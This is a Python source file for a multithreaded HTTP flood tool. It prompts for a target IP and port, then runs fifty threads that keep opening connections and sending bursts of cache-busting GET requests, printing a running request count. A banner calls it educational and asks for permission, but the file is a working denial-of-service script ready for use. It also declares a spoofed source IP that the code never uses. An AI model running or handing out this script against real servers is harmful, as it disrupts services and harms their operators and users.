import threading  # For creating multiple concurrent connections
import socket    # For network connections
import time      # For adding delays and timestamps
from datetime import datetime  # For formatting time in logs

# Basic configuration settings
target_ip = "192.168.1.1"  # Default target IP address
port = 80                  # Default HTTP port
fake_ip = "182.21.20.32"  # Spoofed source IP
already_connected = 0      # Counter for connection attempts
attack_running = True      # Control flag for threads

def show_status():
    """Function to display real-time status updates"""
    global already_connected
    while attack_running:
        # Print current time and connection count, \r returns cursor to start of line
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Total connections: {already_connected}", end='\r')
        time.sleep(1)  # Update every second

def attack():
    """Main function that performs the connection attempts"""
    global already_connected, attack_running
    
    while attack_running:
        try:
            # Create new TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)  # Set connection timeout to 1 second
            
            # Attempt to connect to target
            print(f"\n[*] Attempting to connect to {target_ip}:{port}")
            s.connect((target_ip, port))
            print(f"[+] Connected to {target_ip}:{port}")
            
            # Send multiple HTTP requests per connection
            for _ in range(10):
                # Craft HTTP GET request with headers
                http_request = (
                    f"GET /?{time.time()} HTTP/1.1\r\n"  # Add timestamp to prevent caching
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Accept-Language: en-US,en;q=0.9\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(http_request.encode())  # Send the request
                already_connected += 1
                print(f"[+] Request {already_connected} sent successfully")
            
            s.close()  # Close the socket
            
        except ConnectionRefusedError:
            print(f"\n[!] Connection refused by {target_ip}:{port}")
            time.sleep(1)
        except socket.timeout:
            print(f"\n[!] Connection to {target_ip}:{port} timed out")
            time.sleep(1)
        except socket.error as e:
            print(f"\n[!] Socket error: {e}")
            time.sleep(1)
        except Exception as e:
            print(f"\n[!] Error: {e}")
            time.sleep(1)

def start_attack():
    """Initialize and coordinate the attack"""
    global attack_running
    
    # Display initial banner
    print("\n" + "="*60)
    print(f"Starting TCP flood test on {target_ip}:{port}")
    print("Press Ctrl+C to stop")
    print("="*60 + "\n")
    
    # Test initial connection
    try:
        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_socket.settimeout(2)
        test_socket.connect((target_ip, port))
        test_socket.close()
        print(f"[+] Target {target_ip}:{port} is reachable!")
    except Exception as e:
        print(f"[!] Cannot reach target {target_ip}:{port}")
        print(f"[!] Error: {e}")
        return
    
    # Create and start status monitoring thread
    status_thread = threading.Thread(target=show_status)
    status_thread.daemon = True
    status_thread.start()
    
    # Create and start attack threads
    thread_count = 50
    threads = []
    
    print(f"[*] Creating {thread_count} threads...")
    for i in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)
        thread.start()
        print(f"[+] Thread {i+1} started")
        time.sleep(0.1)
        
    # Keep main thread running until interrupted
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n\n[+] Stopping attack...")
        attack_running = False
        time.sleep(1)
        print("[+] Attack stopped")

# Main program entry point
if __name__ == "__main__":
    # Display ASCII art banner
    print("""
    ╔══════════════════════════════════════════════╗
    ║           TCP Flood Testing Tool              ║
    ║        For Educational Purposes Only          ║
    ║                                              ║
    ║  Only use on systems you own or have         ║
    ║  explicit permission to test.                ║
    ╚══════════════════════════════════════════════╝
    """)
    
    # Get target information from user
    user_ip = input("Enter target IP (or press Enter for default 192.168.1.1): ").strip()
    if user_ip:
        target_ip = user_ip
    
    user_port = input("Enter target port (or press Enter for default 80): ").strip()
    if user_port:
        port = int(user_port)
    
    start = input("\nPress Enter to start or Ctrl+C to exit...")
    start_attack()